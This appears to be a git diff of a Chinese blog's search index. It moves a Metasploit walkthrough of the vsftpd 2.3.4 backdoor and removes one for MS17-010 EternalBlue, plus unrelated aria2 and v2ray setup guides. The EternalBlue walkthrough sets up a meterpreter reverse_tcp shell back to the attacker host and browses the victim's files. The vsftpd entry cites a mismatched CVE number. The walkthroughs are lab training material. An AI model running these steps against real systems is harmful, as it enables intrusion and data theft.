@@ -1,78 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>vsftpd漏洞复现</title>
-    <url>/doc/30165/</url>
-    <content><![CDATA[<blockquote>
-<p>漏洞说明 : </p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 在vsftpd的2.3.4版本存在一个恶意的后门 , 虽然该问题迅速得到了开发人员的修复及删除 , 但是仍有不少人已经下载安装了该漏洞版本.</p>
-<ul>
-<li>发布时间 : 2011-07-03.</li>
-<li>影响范围 : 仅针对vsftpd 2.3.4版本.</li>
-<li>漏洞编号 : CVE-2011-2523.</li>
-</ul>
-</blockquote>
-<a id="more"></a>
-
-
-
-<p><strong>环境声明</strong> : </p>
-<table>
-<thead>
-<tr>
-<th align="left">角色</th>
-<th align="left">操作系统</th>
-<th align="left">IP地址</th>
-<th align="left">工具</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">攻击机</td>
-<td align="left">Kali Linux 2020.2 64位</td>
-<td align="left">192.168.0.102</td>
-<td align="left">msf , nmap , ping</td>
-</tr>
-<tr>
-<td align="left">靶机</td>
-<td align="left">Metasploitable2</td>
-<td align="left">192.168.0.103</td>
-<td align="left"></td>
-</tr>
-</tbody></table>
-<hr>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取靶机操作系统"><a href="#获取靶机操作系统" class="headerlink" title="获取靶机操作系统"></a>获取靶机操作系统</h4><p><strong>命令</strong> : <code>nmap -O 192.168.0.103</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140324.png" alt=""></p>
-<h4 id="获取靶机开放服务"><a href="#获取靶机开放服务" class="headerlink" title="获取靶机开放服务"></a>获取靶机开放服务</h4><p><strong>命令</strong> : <code>nmap -sV 192.168.0.103</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140344.png" alt=""></p>
-<hr>
-<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p><strong>命令</strong> : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo nmap --script=vuln -p21 192.168.0.103	<span class="hljs-comment">#针对21号端口开放的服务进行漏洞脚本扫描.</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140356.png" alt=""></p>
-<hr>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p><strong>命令</strong> : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo msfconsole				<span class="hljs-comment">#启动MSF</span><br>msf5 &gt; search cve-2017-7494				<span class="hljs-comment">#搜索漏洞相关模块</span><br>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor		<span class="hljs-comment">#使用该模块</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140408.png" alt=""></p>
-<h4 id="设置模块参数"><a href="#设置模块参数" class="headerlink" title="设置模块参数"></a>设置模块参数</h4><p><strong>命令</strong> : </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.0.103<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140421.png" alt=""></p>
-<h4 id="执行攻击-建立会话"><a href="#执行攻击-建立会话" class="headerlink" title="执行攻击 , 建立会话"></a>执行攻击 , 建立会话</h4><p><strong>命令</strong> :</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140439.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>网络空间</category>
-      </categories>
-      <tags>
-        <tag>培训</tag>
-        <tag>Linux漏洞</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2020重庆市赛分析</title>
     <url>/doc/61537/</url>
     <content><![CDATA[<blockquote>
@@ -295,8 +223,80 @@
 <p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825223424.png" alt=""></p>
 ]]></content>
       <categories>
-        <category>漏洞复现</category>
         <category>网络空间</category>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>培训</tag>
+        <tag>Linux漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vsftpd漏洞复现</title>
+    <url>/doc/30165/</url>
+    <content><![CDATA[<blockquote>
+<p>漏洞说明 : </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; 在vsftpd的2.3.4版本存在一个恶意的后门 , 虽然该问题迅速得到了开发人员的修复及删除 , 但是仍有不少人已经下载安装了该漏洞版本.</p>
+<ul>
+<li>发布时间 : 2011-07-03.</li>
+<li>影响范围 : 仅针对vsftpd 2.3.4版本.</li>
+<li>漏洞编号 : CVE-2011-2523.</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+
+
+<p><strong>环境声明</strong> : </p>
+<table>
+<thead>
+<tr>
+<th align="left">角色</th>
+<th align="left">操作系统</th>
+<th align="left">IP地址</th>
+<th align="left">工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">攻击机</td>
+<td align="left">Kali Linux 2020.2 64位</td>
+<td align="left">192.168.0.102</td>
+<td align="left">msf , nmap , ping</td>
+</tr>
+<tr>
+<td align="left">靶机</td>
+<td align="left">Metasploitable2</td>
+<td align="left">192.168.0.103</td>
+<td align="left"></td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="获取靶机操作系统"><a href="#获取靶机操作系统" class="headerlink" title="获取靶机操作系统"></a>获取靶机操作系统</h4><p><strong>命令</strong> : <code>nmap -O 192.168.0.103</code> </p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140324.png" alt=""></p>
+<h4 id="获取靶机开放服务"><a href="#获取靶机开放服务" class="headerlink" title="获取靶机开放服务"></a>获取靶机开放服务</h4><p><strong>命令</strong> : <code>nmap -sV 192.168.0.103</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140344.png" alt=""></p>
+<hr>
+<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p><strong>命令</strong> : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo nmap --script=vuln -p21 192.168.0.103	<span class="hljs-comment">#针对21号端口开放的服务进行漏洞脚本扫描.</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140356.png" alt=""></p>
+<hr>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p><strong>命令</strong> : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@kali:~$ sudo msfconsole				<span class="hljs-comment">#启动MSF</span><br>msf5 &gt; search cve-2017-7494				<span class="hljs-comment">#搜索漏洞相关模块</span><br>msf5 &gt; use exploit/unix/ftp/vsftpd_234_backdoor		<span class="hljs-comment">#使用该模块</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140408.png" alt=""></p>
+<h4 id="设置模块参数"><a href="#设置模块参数" class="headerlink" title="设置模块参数"></a>设置模块参数</h4><p><strong>命令</strong> : </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; <span class="hljs-built_in">set</span> RHOSTS 192.168.0.103<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140421.png" alt=""></p>
+<h4 id="执行攻击-建立会话"><a href="#执行攻击-建立会话" class="headerlink" title="执行攻击 , 建立会话"></a>执行攻击 , 建立会话</h4><p><strong>命令</strong> :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200827140439.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>网络空间</category>
+        <category>漏洞复现</category>
       </categories>
       <tags>
         <tag>培训</tag>
@@ -340,190 +340,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MS17-010漏洞复现(详细)</title>
-    <url>/doc/15113/</url>
-    <content><![CDATA[<blockquote>
-<p>写在前面的话 : </p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 本文将以大名鼎鼎的永恒之蓝漏洞为例 , 逐步讲解如何利用msf对目标系统进行渗透 , 全文会对每个步骤的进行较为详细的讲解 , 适合初识msf的人观看.</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 因为受ms17-010漏洞影响的操作系统版本较多 , 如果用一篇文章写完的话比较长 , 所以针对该漏洞我会分两篇来写 , 其中一篇主要讲解漏洞利用过程(本文) , 另外一篇只会简单说明针对不同的操作系统在渗透过程中所使用模块的不同区别. </p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 本文所使用的模块仅针对Windows 7 旗舰版 SP1 64位.</p>
-</blockquote>
-<a id="more"></a>
-
-
-
-<p><strong>环境声明</strong> : </p>
-<table>
-<thead>
-<tr>
-<th>角色</th>
-<th>操作系统</th>
-<th>IP地址</th>
-<th>工具</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>攻击机</td>
-<td>Kali Linux 2020.2 64位</td>
-<td>192.168.0.102</td>
-<td>nmap , metasploit</td>
-</tr>
-<tr>
-<td>靶机</td>
-<td>Windows 7 旗舰版 SP1 64位</td>
-<td>192.168.0.103</td>
-<td></td>
-</tr>
-</tbody></table>
-<p><em>附 : Windows系统镜像SHA-1  :  2CE0B2DB34D76ED3F697CE148CB7594432405E23</em></p>
-<hr>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="利用-ping-命令检测网络是否互通"><a href="#利用-ping-命令检测网络是否互通" class="headerlink" title="利用 ping 命令检测网络是否互通"></a>利用 <code>ping</code> 命令检测网络是否互通</h4><p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232435.png" alt=""></p>
-<h4 id="利用-nmap-扫描工具获取靶机信息"><a href="#利用-nmap-扫描工具获取靶机信息" class="headerlink" title="利用 nmap 扫描工具获取靶机信息"></a>利用 <code>nmap</code> 扫描工具获取靶机信息</h4><h5 id="获取靶机操作系统"><a href="#获取靶机操作系统" class="headerlink" title="获取靶机操作系统"></a>获取靶机操作系统</h5><p><strong>命令</strong> : <code>sudo nmap -O 192.168.0.103</code></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 在回显中找到 <code>OS details</code> 字段 , 可看到扫描工具 <strong>猜测</strong> 的操作系统 , 猜测操作系统中可能性最大的排第一 , 往后顺延.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232448.png" alt=""></p>
-<h5 id="获取靶机开放服务"><a href="#获取靶机开放服务" class="headerlink" title="获取靶机开放服务"></a>获取靶机开放服务</h5><p><strong>命令</strong> : <code>sudo nmap -sV 192.168.0.103</code></p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 根据开放服务结合经验推测是否存在漏洞.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232500.png" alt=""></p>
-<hr>
-<h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>&nbsp;&nbsp;&nbsp;&nbsp; 在上一步的信息收集中我们仅是对靶机 <strong>可能存在</strong> 的漏洞做了 <strong>推测</strong> , 那么如何验证是否存在该漏洞呢 ? 下文将针对此漏洞的<strong>验证</strong>介绍两种方法 : nmap脚本扫描和msf中 <strong>针对该漏洞</strong> 中的扫描模块. <em>(针对单一漏洞的话 , 后者扫描效率比前者高. 但前者不仅仅是针对这一个漏洞 , 而是会扫描出存在的所有漏洞 , 如何选择就见仁见智了)</em> </p>
-<h4 id="nmap脚本扫描"><a href="#nmap脚本扫描" class="headerlink" title="nmap脚本扫描"></a>nmap脚本扫描</h4><p><strong>命令</strong> : <code>sudo nmap --script=vuln 192.168.0.103</code> </p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 在回显结果中找到 <code>Host script results</code> 在其返回的结果中查找是否有我们猜测的漏洞. </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232520.png" alt=""></p>
-<h4 id="MSF使用针对该漏洞的扫描模块"><a href="#MSF使用针对该漏洞的扫描模块" class="headerlink" title="MSF使用针对该漏洞的扫描模块"></a>MSF使用针对该漏洞的扫描模块</h4><h5 id="启动MSF"><a href="#启动MSF" class="headerlink" title="启动MSF"></a>启动MSF</h5><p><strong>命令</strong> : <code>sudo msfconsole</code></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232536.png" alt=""></p>
-<h5 id="搜索该漏洞相关模块并选择扫描模块"><a href="#搜索该漏洞相关模块并选择扫描模块" class="headerlink" title="搜索该漏洞相关模块并选择扫描模块"></a>搜索该漏洞相关模块并选择扫描模块</h5><p>命令 : </p>
-<p><strong>搜索</strong>相关模块 : <code>search ms17-010</code></p>
-<p><strong>选择</strong>对应模块 : <code>use auxiliary/scanner/smb/smb_ms17_010</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232605.png" alt=""></p>
-<h5 id="设置模块所需参数"><a href="#设置模块所需参数" class="headerlink" title="设置模块所需参数"></a>设置模块所需参数</h5><p>命令 : </p>
-<p><strong>查看模块全部设置项</strong> : <code>show options</code> </p>
-<p><strong>设置模块所需设置项</strong> : <code>set RHOSTS 192.168.0.103</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232617.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232631.png" alt=""></p>
-<h5 id="运行该扫描模块"><a href="#运行该扫描模块" class="headerlink" title="运行该扫描模块"></a>运行该扫描模块</h5><p><strong>命令</strong> : <code>exploit</code> 或者 <code>run</code> <em>(二选一)</em> </p>
-<p>前面[+] 一般代表成功 , [-] 一般代表失败.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232651.png" alt=""></p>
-<hr>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>&nbsp;&nbsp;&nbsp;&nbsp; 在上一步的漏洞探测过程中我们已经确定了目标系统存在该漏洞 , 那么我们如何利用该漏洞如攻击目标系统呢 ? 比方说获取目标系统中的文件 , 在目标系统中种植后门等 . 下文将详细讲解该漏洞的利用过程. </p>
-<h4 id="搜索该漏洞相关模块并选择漏洞执行模块"><a href="#搜索该漏洞相关模块并选择漏洞执行模块" class="headerlink" title="搜索该漏洞相关模块并选择漏洞执行模块"></a>搜索该漏洞相关模块并选择漏洞执行模块</h4><blockquote>
-<p>启动msf上面讲过我这里就不讲了.</p>
-</blockquote>
-<p>退回msf主界面并重新搜索该漏洞相关模块.</p>
-<p>命令 : </p>
-<p><strong>退回主界面</strong> : <code>back</code> </p>
-<p><strong>搜索相关模块</strong> : <code>search ms17-010</code> </p>
-<p><strong>选择漏洞执行模块</strong> :  <code>use exploit/windows/smb/ms17_010_eternalblue</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232705.png" alt=""></p>
-<h4 id="设置该模块运行所需参数"><a href="#设置该模块运行所需参数" class="headerlink" title="设置该模块运行所需参数"></a>设置该模块运行所需参数</h4><p>命令 : </p>
-<p><strong>查看模块全部参数</strong>  <em>(注意 , 这里是模块参数 , 与下文的载荷参数区分开)</em> : <code>show options</code> </p>
-<p><strong>设置模块所需参数</strong> : <code>set RHOSTS 192.168.0.103</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232729.png" alt=""></p>
-<h4 id="设置载荷及载荷所需参数"><a href="#设置载荷及载荷所需参数" class="headerlink" title="设置载荷及载荷所需参数"></a>设置载荷及载荷所需参数</h4><p>&nbsp;&nbsp;&nbsp;&nbsp; 载荷具体是什么可以去百度 , 这里一言两语解释不清. 就简单说下 : </p>
-<ul>
-<li>需要进入模块才能使用载荷. 但载荷并不是模块的必需品.因此你可以看到在上面的模块全部参数中并没有载荷这一选项.</li>
-<li>不是所有模块都支持使用载荷 , 也不是所有的模块使用的载荷都是同一个. 载荷针对不同的情况是不同的.</li>
-<li>不使用载荷和使用载荷进行攻击是完全两回事 , 前者不使用载荷可能最多只会令目标系统关机并让对方察觉到遭受了攻击 , 而如果是使用了载荷攻击目标系统能在不让对方察觉到的情况下获得对方系统的管理权.</li>
-<li>载荷也有参数.</li>
-</ul>
-<p>命令 : </p>
-<p><strong>设置载荷</strong> :  <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code> </p>
-<p><strong>显示载荷全部设置</strong> : <code>show options</code> </p>
-<p><strong>设置载荷所需设置</strong> :  <code>set LHOST 192.168.0.102</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232748.png" alt=""></p>
-<h4 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h4><p><strong>命令</strong> : <code>exploit</code> 或者 <code>run</code> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825232921.png" alt=""></p>
-<h4 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h4><blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; 后渗透内容很多 , 具体包括内网提权 , 端口转发 , 跳板攻击等等 , 以后我会开个单章具体介绍. 现目前仅介绍最基本的.</p>
-</blockquote>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; <strong>在成功获取到了目标系统返回给我们的meterpreter后我们终于可以做我们想做的事儿了 , 比如我们查看对方桌面有什么文件 ,  查看路由 , 获取文件内容等等.</strong> </p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825233118.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200825233235.png" alt=""></p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-        <category>网络空间</category>
-      </categories>
-      <tags>
-        <tag>Windows漏洞</tag>
-        <tag>培训</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>aria2离线下载服务器搭建(Ubuntu环境下)</title>
-    <url>/doc/3686/</url>
-    <content><![CDATA[<blockquote>
-<p>环境说明:</p>
-<ul>
-<li>window7</li>
-<li>Ubuntu 18.04.4 LTS</li>
-</ul>
-</blockquote>
-<a id="more"></a>
-
-<hr>
-<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>大致讲一下aria2实现离线下载服务器的流程:</p>
-<ol>
-<li>将aria2c这个下载工具以<strong>守护进程</strong>方式启动.</li>
-<li>前者启动后会默认使用<strong>当前用户家目录</strong>下<code>~/.aria2/aria2.conf</code>文件中的配置.如果想指定配置文件路径,则需使用<code>--conf-path=&lt;PATH&gt;</code>参数.</li>
-</ol>
-<p>综上所述,搭建离线下载服务器简单来说就三步:<br>3. <strong>安装</strong>aria2.<br>4. <strong>配置</strong>好所需要的配置文件. <em>(例:下载路径,外部访问端口…)</em><br>5. 以守护进程模式<strong>启动</strong>它. <em>(为防止幺蛾子最好指定配置文件路径)</em></p>
-<hr>
-<h3 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahant@yuanhe:~$ sudo apt-get install aria2 -y<br></code></pre></td></tr></table></figure>
-<hr>
-<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>下载配置文件: <a href="http://aria2c.com/archiver/aria2.conf" target="_blank" rel="noopener">aria2c</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ mkdir ~/.aria2<br>xiahan@yuanhe:~$ wget http://aria2c.com/archiver/aria2.conf -O ~/.aria2/aria2.conf<br></code></pre></td></tr></table></figure>
-<p>创建会话文件<code>/etc/aria2/aria2.session</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ mkdir /etc/aria2<br>xiahan@yuanhe:~$ touch /etc/aria2/aria2.session<br></code></pre></td></tr></table></figure>
-<hr>
-<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ aria2c --conf-path ~/.aria2/aria2.conf -D<br></code></pre></td></tr></table></figure>
-
-
-<h4 id="验证-重启"><a href="#验证-重启" class="headerlink" title="验证,重启"></a>验证,重启</h4><p>验证:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ ps -A|grep aria2c<br> 9555 ?        00:00:00 aria2c<br></code></pre></td></tr></table></figure>
-<p>重启:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ ps -A|grep aria2c                        <br> 9555 ?        00:00:00 aria2c                          <br>xiahan@yuanhe:~$ <span class="hljs-built_in">kill</span> -9 9555                             <br>xiahan@yuanhe:~$ aria2c --conf-path ~/.aria2/aria2.conf -D<br></code></pre></td></tr></table></figure>
-
-<br>
-
-
-
-<hr>
-<hr>
-<h3 id="windows环境"><a href="#windows环境" class="headerlink" title="windows环境"></a>windows环境</h3><h4 id="安装-配置-启动"><a href="#安装-配置-启动" class="headerlink" title="安装,配置,启动"></a>安装,配置,启动</h4><p>windows下就简单的多了.<br>下载:<a href="http://aria2c.com/archiver/aria2.zip" target="_blank" rel="noopener">懒人包</a><br>下载完成后解压,双击<code>aria2.exe</code>就行了 <em>注:不是 aria2c.exe</em><br><br></p>
-<h4 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h4><p>下载 <a href="https://github.com/aria2/aria2/releases/latest" target="_blank" rel="noopener">aria2最新版本</a>中的<code>xxxxx-xxxxxx-win-64bit-build1.zip</code>文件,将其中的<code>aria2c.exe</code>覆盖掉懒人包中的<code>&#39;aria2c.exe</code></p>
-<br>
-
-<hr>
-<hr>
-<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="谷歌插件"><a href="#谷歌插件" class="headerlink" title="谷歌插件"></a>谷歌插件</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>在线安装 : <a href="https://chrome.google.com/webstore/detail/aria2-for-chrome/mpkodccbngfoacfalldjimigbofkhgjn" target="_blank" rel="noopener">谷歌商店</a></p>
-<p>离线安装 : <a href="https://yuanhe-xia.lanzous.com/b0c2n6amb" target="_blank" rel="noopener">蓝奏云</a>       提取码 : ag1w </p>
-<p>安装方法详情见 : <a href="https://www.yuanhe-xia.cn/doc/1720/">浏览器插件如何安装</a> </p>
-<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
-<li><p>单击插件点开插件设置页.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823232355.png" alt=""></p>
-</li>
-<li><p>依次配置插件设置.(第7步错了,设置完后刷新页面激活)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823232409.png" alt=""></p>
-</li>
-<li><p>全部设置完后如图.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823232414.png" alt=""></p>
-</li>
-</ol>
-<hr>
-<h3 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h3><p>网址:<a href="https://aria2c.com/" target="_blank" rel="noopener">Aria2 Web 控制台</a></p>
-<p>设置:<code>扳手图标--&gt;JSON-RPC Path</code></p>
-<hr>
-<h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><p>安卓 : </p>
-<p>​    下载地址 : <a href="https://github.com/devgianlu/Aria2App/releases/latest" target="_blank" rel="noopener">GitHub</a>   <a href="https://play.google.com/store/apps/details?id=com.gianlu.aria2app&pcampaignid=MKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1" target="_blank" rel="noopener">play商店</a>   <a href="https://yuanhe-xia.lanzous.com/iiKV5fnlchi" target="_blank" rel="noopener">蓝奏云</a></p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>其他</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kali安装(vmware tools)</title>
     <url>/doc/20007/</url>
     <content><![CDATA[<blockquote>
@@ -534,7 +350,7 @@
 
 <hr>
 <hr>
-<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装VMware-Workstation"><a href="#安装VMware-Workstation" class="headerlink" title="安装VMware Workstation"></a>安装VMware Workstation</h3><p>下载地址:  <a href="https://pan.baidu.com/s/1VSY5Q9Rtqfy3apd75SSBsQ" target="_blank" rel="noopener">链接</a>  提取码：dmpw </p>
+<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="安装VMware-Workstation"><a href="#安装VMware-Workstation" class="headerlink" title="安装VMware Workstation"></a>安装VMware Workstation</h3><p>下载地址:  <a href="https://xiahan-my.sharepoint.com/:f:/g/personal/xiahan_yuanhe-xia_cn/Em1D1zQred5IiMzR1vEtv8QBEMxpK_wSjQH_8wL0Wn-0gg?e=H5TSFH" target="_blank" rel="noopener">链接</a> </p>
 <h3 id="下载系统镜像文件"><a href="#下载系统镜像文件" class="headerlink" title="下载系统镜像文件"></a>下载系统镜像文件</h3><p>kali下载地址 : <a href="https://cdimage.kali.org/kali-2020.2/kali-linux-2020.2-installer-amd64.iso" target="_blank" rel="noopener">官方</a>   <a href="https://images.offensive-security.com/kali-linux-2020.2-installer-amd64.iso.torrent" target="_blank" rel="noopener">Torrent</a> </p>
 <hr>
 <hr>
@@ -656,95 +472,6 @@
       </tags>
   </entry>
   <entry>
-    <title>v2ray客户端配置(v2rayN和SwitchyOmega)</title>
-    <url>/doc/49460/</url>
-    <content><![CDATA[<p>v2ray客户端配置(v2rayN和SwitchyOmega)</p>
-<h2 id="使用模式"><a href="#使用模式" class="headerlink" title="使用模式:"></a>使用模式:</h2><ul>
-<li>v2rayN单独使用(PAC模式).<ul>
-<li>说明:无需配置谷歌插件,适合日常使用360,QQ,搜狗等浏览器的用户.</li>
-<li>不足:有些时候一些软件会莫名其妙地走代理的流量,导致网页代理速度变慢或不稳定.</li>
-</ul>
-</li>
-<li>v2rayN+SwitchyOmega配合使用.<ul>
-<li>除配置v2rayN客户端外还需配置SwitchyOmega插件,适合浏览器为chrome的用户.</li>
-<li>不足:暂时没发现.</li>
-</ul>
-</li>
-</ul>
-<p>为便于阅读,故下面将两种方法分开单独讲,彼此互不影响.<br><em>(个人推荐第二种,但如果实在放不下360,QQ,搜狗等浏览器的用户用第一种也没事)</em></p>
-<a id="more"></a>
-
-<br>
-
-<hr>
-<hr>
-<h2 id="v2rayN单独使用-PAC模式"><a href="#v2rayN单独使用-PAC模式" class="headerlink" title="v2rayN单独使用(PAC模式)."></a>v2rayN单独使用(PAC模式).</h2><h3 id="下载所需文件"><a href="#下载所需文件" class="headerlink" title="下载所需文件"></a>下载所需文件</h3><p>v2ray核心:<a href="https://github.com/v2ray/v2ray-core/releases/latest" target="_blank" rel="noopener">v2ray-core</a><br>v2rayN客户端:<a href="https://github.com/2dust/v2rayN/releases/latest" target="_blank" rel="noopener">v2rayN</a></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233810.png" alt=""></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823233823.png" alt=""></p>
-<h3 id="安装v2rayN客户端"><a href="#安装v2rayN客户端" class="headerlink" title="安装v2rayN客户端"></a>安装v2rayN客户端</h3><ol>
-<li><p>之后我们将两个压缩包解压至<strong>同一个文件夹</strong>中,该文件夹路径则为软件安装路径.<br><em>注:此处两个压缩包的文件要放在同一个文件夹下面,若提示存在相同文件,覆盖就行</em></p>
-</li>
